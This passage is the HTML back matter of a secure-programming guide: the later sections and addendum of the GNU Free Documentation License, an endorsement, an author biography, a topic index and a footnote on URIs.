><A
NAME="FDL-SECTION7"
></A
>7. AGGREGATION WITH INDEPENDENT WORKS</DT
><DD
><P
>	  A compilation of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> or
	  its derivatives with other separate and independent documents or
	  works, in or on a volume of a storage or distribution medium, does not
	  as a whole count as a <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
> of the <A
HREF="#FDL-DOCUMENT"
> Document</A
>,
	  provided no compilation copyright is claimed for the compilation.
	  Such a compilation is called an "aggregate", and this License does not
	  apply to the other self-contained works thus compiled with the <A
HREF="#FDL-DOCUMENT"
>Document</A
> , on account of their being
	  thus compiled, if they are not themselves derivative works of the
	  <A
HREF="#FDL-DOCUMENT"
>Document</A
>.  If the <A
HREF="#FDL-COVER-TEXTS"
>Cover Text</A
> requirement of <A
HREF="#FDL-SECTION3"
>section 3</A
> is applicable to these copies
	  of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>, then if the <A
HREF="#FDL-DOCUMENT"
>Document</A
> is less than one quarter of the
	  entire aggregate, the <A
HREF="#FDL-DOCUMENT"
>Document&#8217;s</A
>
	  <A
HREF="#FDL-COVER-TEXTS"
>Cover Texts</A
> may be placed on
	  covers that surround only the <A
HREF="#FDL-DOCUMENT"
>Document</A
> within the aggregate. Otherwise
	  they must appear on covers around the whole aggregate.
	</P
></DD
><DT
><A
NAME="FDL-SECTION8"
></A
>8. TRANSLATION</DT
><DD
><P
>	  Translation is considered a kind of modification, so you may
	  distribute translations of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> under the terms of <A
HREF="#FDL-SECTION4"
>section 4</A
>. Replacing <A
HREF="#FDL-INVARIANT"
> Invariant Sections</A
> with translations
	  requires special permission from their copyright holders, but you may
	  include translations of some or all <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
> in addition to the
	  original versions of these <A
HREF="#FDL-INVARIANT"
>Invariant
	  Sections</A
>. You may include a translation of this License
	  provided that you also include the original English version of this
	  License. In case of a disagreement between the translation and the
	  original English version of this License, the original English version
	  will prevail.
	</P
></DD
><DT
><A
NAME="FDL-SECTION9"
></A
>9. TERMINATION</DT
><DD
><P
>	  You may not copy, modify, sublicense, or distribute the <A
HREF="#FDL-DOCUMENT"
>Document</A
> except as expressly provided
	  for under this License. Any other attempt to copy, modify, sublicense
	  or distribute the <A
HREF="#FDL-DOCUMENT"
>Document</A
> is
	  void, and will automatically terminate your rights under this
	  License. However, parties who have received copies, or rights, from
	  you under this License will not have their licenses terminated so long
	  as such parties remain in full compliance.
	</P
></DD
><DT
><A
NAME="FDL-SECTION10"
></A
>10. FUTURE REVISIONS OF THIS LICENSE</DT
><DD
><P
>	  The <A
HREF="http://www.gnu.org/fsf/fsf.html"
TARGET="_top"
>Free
	  Software Foundation</A
> may publish new, revised versions of the
	  GNU Free Documentation License from time to time. Such new versions
	  will be similar in spirit to the present version, but may differ in
	  detail to address new problems or concerns. See <A
HREF="http://www.gnu.org/copyleft"
TARGET="_top"
>http://www.gnu.org/copyleft/</A
>.
	</P
><P
>	  Each version of the License is given a distinguishing version
	  number. If the <A
HREF="#FDL-DOCUMENT"
>Document</A
> specifies
	  that a particular numbered version of this License "or any later
	  version" applies to it, you have the option of following the terms and
	  conditions either of that specified version or of any later version
	  that has been published (not as a draft) by the Free Software
	  Foundation. If the <A
HREF="#FDL-DOCUMENT"
>Document</A
> does
	  not specify a version number of this License, you may choose any
	  version ever published (not as a draft) by the Free Software
	  Foundation.
	</P
></DD
><DT
><A
NAME="FDL-USING"
></A
>Addendum</DT
><DD
><P
>	  To use this License in a document you have written, include a copy of
	  the License in the document and put the following copyright and
	  license notices just after the title page:
	</P
><P
>	  Copyright  YEAR  YOUR NAME.
	</P
><P
>	  Permission is granted to copy, distribute and/or modify this document
	  under the terms of the GNU Free Documentation License, Version 1.1 or
	  any later version published by the Free Software Foundation; with the
	  <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
> being LIST
	  THEIR TITLES, with the <A
HREF="#FDL-COVER-TEXTS"
>Front-Cover
	  Texts</A
> being LIST, and with the <A
HREF="#FDL-COVER-TEXTS"
>Back-Cover Texts</A
> being LIST.  A copy
	  of the license is included in the section entitled <SPAN
CLASS="QUOTE"
>&#8220;GNU Free
	  Documentation License&#8221;</SPAN
>.
	</P
><P
>	  If you have no <A
HREF="#FDL-INVARIANT"
>Invariant
	  Sections</A
>, write "with no Invariant Sections" instead of saying
	  which ones are invariant.  If you have no <A
HREF="#FDL-COVER-TEXTS"
>Front-Cover Texts</A
>, write "no
	  Front-Cover Texts" instead of "Front-Cover Texts being LIST"; likewise
	  for <A
HREF="#FDL-COVER-TEXTS"
>Back-Cover Texts</A
>.
	</P
><P
>	  If your document contains nontrivial examples of program code, we
	  recommend releasing these examples in parallel under your choice of
	  free software license, such as the <A
HREF="http://www.gnu.org/copyleft/gpl.html"
TARGET="_top"
> GNU General Public
	  License</A
>, to permit their use in free software.
	</P
></DD
></DL
></DIV
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="ENDORSEMENTS"
></A
>Appendix E. Endorsements</H1
><P
>This version of the document is endorsed by the
original author, David A. Wheeler, as a document that
should improve the security of programs,
when applied correctly.
Note that no book, including this one, can guarantee that a developer
who follows its guidelines will produce perfectly secure software.
Modifications (including translations) must remove this appendix
per the license agreement included above.</P
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="ABOUT-AUTHOR"
></A
>Appendix F. About the Author</H1
><DIV
CLASS="MEDIAOBJECT"
><P
><IMG style="max-width:90%"
SRC="dwheeler2003b.jpg"></P
></DIV
><P
>Dr. David A. Wheeler is an expert in computer security and
has long specialized in development techniques for large and
high-risk software systems.
He has been involved in software development
since the mid-1970s,
and with computer security since the early 1980s.
His areas of knowledge include computer security
(including developing secure software)
and open source software.</P
><P
>Dr. Wheeler is co-author and lead editor of the IEEE book
<EM
>Software Inspection: An Industry Best Practice</EM
>
and author of the book
<EM
>Ada95: The Lovelace Tutorial</EM
>.
He is also the author of many smaller papers and articles, including the
Linux <EM
>Program Library HOWTO</EM
>.</P
><P
>Dr. Wheeler hopes that, by making this document available, other
developers will make their software more secure.
You can reach him by email at dwheeler@dwheeler.com (no spam please),
and you can also see his web site at
<A
HREF="http://www.dwheeler.com"
TARGET="_top"
>http://www.dwheeler.com</A
>.</P
></DIV
><DIV
CLASS="INDEX"
><HR><H1
><A
NAME="AEN3922"
></A
>Index</H1
><DL
><DT
>blacklist,
    <A
HREF="#VALIDATION-BASICS"
>Basics of input validation</A
>
  </DT
><DT
>buffer bounds,
    <A
HREF="#BUFFER-OVERFLOW"
>Restrict Operations to Buffer Bounds (Avoid Buffer Overflow)</A
>
  </DT
><DT
>buffer overflow,
    <A
HREF="#BUFFER-OVERFLOW"
>Restrict Operations to Buffer Bounds (Avoid Buffer Overflow)</A
>
  </DT
><DT
>complete mediation,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>design,
    <A
HREF="#INTERNALS"
>Design Your Program for Security</A
>
  </DT
><DT
>dynamically linked libraries (DLLs),
    <A
HREF="#DLLS"
>Dynamically Linked Libraries</A
>
  </DT
><DT
>easy to use,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>economy of mechanism,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>fail-safe defaults,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>format strings,
    <A
HREF="#CONTROL-FORMATTING"
>Control Data Formatting (Format Strings)</A
>
  </DT
><DT
>injection
  </DT
><DD
><DL
><DT
>shell,
    <A
HREF="#SHELL-INJECTION"
>Shell injection</A
>
  </DT
><DD
><DL
></DL
></DD
><DT
>SQL,
    <A
HREF="#SQL-INJECTION"
>SQL injection</A
>
  </DT
><DD
><DL
></DL
></DD
></DL
></DD
><DT
>input validation,
    <A
HREF="#INPUT"
>Validate All Input</A
>
  </DT
><DT
>least common mechanism,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>least privilege,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>,
    <A
HREF="#MINIMIZE-PRIVILEGES"
>Minimize Privileges</A
>
  </DT
><DT
>logical quotation,
    <A
HREF="#CONVENTIONS"
>Document Conventions</A
>
  </DT
><DT
>metacharacters,
    <A
HREF="#HANDLE-METACHARACTERS"
>Handle Metacharacters</A
>
  </DT
><DT
>minimize feedback,
    <A
HREF="#MINIMIZE-FEEDBACK"
>Minimize Feedback</A
>
  </DT
><DT
>non-bypassability,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>open design,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>psychological acceptability,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>salted hashes,
    <A
HREF="#PASSWORDS"
>Passwords</A
>
  </DT
><DT
>Saltzer and Schroeder,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>separation of privilege,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>shell injection,
    <A
HREF="#SHELL-INJECTION"
>Shell injection</A
>
  </DT
><DT
>simplicity,
    <A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Follow Good Security Design Principles</A
>
  </DT
><DT
>SQL injection,
    <A
HREF="#SQL-INJECTION"
>SQL injection</A
>
  </DT
><DT
>time of check - time of use,
    <A
HREF="#NON-ATOMIC"
>Sequencing (Non-Atomic) Problems</A
>
  </DT
><DT
>TOCTOU,
    <A
HREF="#NON-ATOMIC"
>Sequencing (Non-Atomic) Problems</A
>
  </DT
><DT
>UTF-8,
    <A
HREF="#CHARACTER-ENCODING-UTF8"
>Introduction to UTF-8</A
>
  </DT
><DT
>UTF-8 security issues,
    <A
HREF="#UTF8-SECURITY-ISSUES"
>UTF-8 Security Issues</A
>
  </DT
><DT
>whitelist,
    <A
HREF="#VALIDATION-BASICS"
>Basics of input validation</A
>
  </DT
></DL
></DIV
></DIV
><H3
CLASS="FOOTNOTES"
>Notes</H3
><TABLE
BORDER="0"
CLASS="FOOTNOTES"
WIDTH="100%"
><TR
><TD
ALIGN="LEFT"
VALIGN="TOP"
WIDTH="5%"
><A
NAME="FTN.AEN1435"
HREF="#AEN1435"
><SPAN
CLASS="footnote"
>[1]</SPAN
></A
></TD
><TD
ALIGN="LEFT"
VALIGN="TOP"
WIDTH="95%"
><P
>Technically, a hypertext link can be any
<SPAN
CLASS="QUOTE"
>&#8220;uniform resource identifier&#8221;</SPAN
> (URI).
The term <SPAN
CLASS="QUOTE"
>&#8220;Uniform Resource Locator&#8221;</SPAN
> (URL)
refers to the subset of URIs
that identify resources via a representation of their primary access
mechanism (e.g., their network "location"), rather than identifying
the resource by name or by some other attribute(s) of that resource.
Many people use the term <SPAN
CLASS="QUOTE"
>&#8220;URL&#8221;</SPAN
> as synonymous with <SPAN
CLASS="QUOTE"
>&#8220;URI&#8221;</SPAN
>, since URLs
are the most common kind of URI.
For example, the encoding used in URIs is actually called <SPAN
CLASS="QUOTE"
>&#8220;URL encoding&#8221;</SPAN
>.</P
></TD
></TR
></TABLE
></BODY
></HTML
>